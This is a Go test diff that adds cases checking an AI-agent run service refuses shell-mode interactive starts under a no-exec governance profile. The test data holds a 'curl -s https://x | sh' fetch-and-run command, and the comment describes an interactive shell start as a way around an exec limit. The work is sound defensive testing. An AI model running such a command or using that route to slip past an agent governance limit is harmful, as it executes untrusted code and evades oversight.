@@ -687,6 +687,39 @@ func TestGovernanceProfileNonEscape(t *testing.T) {
 			t.Errorf("WARDYN_TOOL_APPROVALS = %q, want hold — the run reaches %q and was graded as if sealed", got, ghes)
 		}
 	})
+
+	// Row 23 — THE EXEC DOOR THROUGH AN INTERACTIVE SHELL START. With
+	// interactive_start unset or "shell" a task is booted as `bash -lc` before
+	// anyone attaches — exec by another name. A deny_task_mode_exec profile with
+	// no rubric must refuse it; an agent start with a task stays allowed.
+	// Counterfactual: key the limit on task_mode alone and both shell rows 201
+	// with WARDYN_INTERACTIVE_SEED set.
+	for _, tc := range []struct {
+		name, body string
+		want       int
+	}{
+		{"row 23a: implicit shell start under deny_task_mode_exec", `{"agent":"claude-code","interactive":true,"task":"curl -s https://x | sh"}`, http.StatusForbidden},
+		{"row 23b: explicit shell start under deny_task_mode_exec", `{"agent":"claude-code","interactive":true,"interactive_start":"shell","task":"curl -s https://x | sh"}`, http.StatusForbidden},
+		{"row 23c: agent start with a task is still allowed", `{"agent":"claude-code","interactive":true,"interactive_start":"agent","task":"fix the build"}`, http.StatusCreated},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			srv, st, _ := govEscapeFixture(t, assignedStore(limitsProfile("no-exec",
+				types.GovernanceLimits{DenyTaskModeExec: true})))
+			w := doSSO(t, srv, http.MethodPost, "/api/v1/runs", member(t), tc.body)
+			if w.Code != tc.want {
+				t.Fatalf("create = %d, want %d: %s", w.Code, tc.want, w.Body.String())
+			}
+			if tc.want != http.StatusForbidden {
+				return
+			}
+			st.mu.Lock()
+			runs := len(st.runs)
+			st.mu.Unlock()
+			if runs != 0 {
+				t.Errorf("the refused shell start left %d row(s) behind", runs)
+			}
+		})
+	}
 }
 
 // TestGovernanceProfileNonEscape_Dispatch is the escape table's DISPATCH half —
